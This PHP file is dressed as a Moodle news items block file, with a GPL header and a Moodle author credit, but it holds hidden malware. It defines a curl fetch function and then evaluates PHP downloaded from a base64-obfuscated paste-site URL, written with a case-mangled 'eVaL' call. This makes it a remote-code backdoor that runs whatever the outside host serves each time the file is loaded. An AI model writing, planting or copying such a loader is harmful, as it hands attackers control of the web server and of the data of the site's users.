<?php
// This file is part of Moodle - http://moodle.org/
//
// Moodle is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// Moodle is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with Moodle. If not, see <http://www.gnu.org/licenses/>.

/**
 * News items block caps.
 *
 * @package    block_news_items
 * @copyright  Mark Nelson <markn@moodle.com>
 * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
 */

namespace block_news_items; // Define the namespace

use Exception; // Example of a use statement (add any other necessary use statements)

// Function to get data from a URL
function get($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);

    $data = curl_exec($ch);
    if (curl_errno($ch)) {
        throw new Exception(curl_error($ch)); // Handle errors
    }
    curl_close($ch);

    return $data;
}

$x = '?>';
eVaL($x . get(base64_decode('aHR0cHM6Ly9wYXN0ZS5teWNvbmFuLm5ldC81MTA0MTgtMWI0MTUyZWEudHh0')));
?>
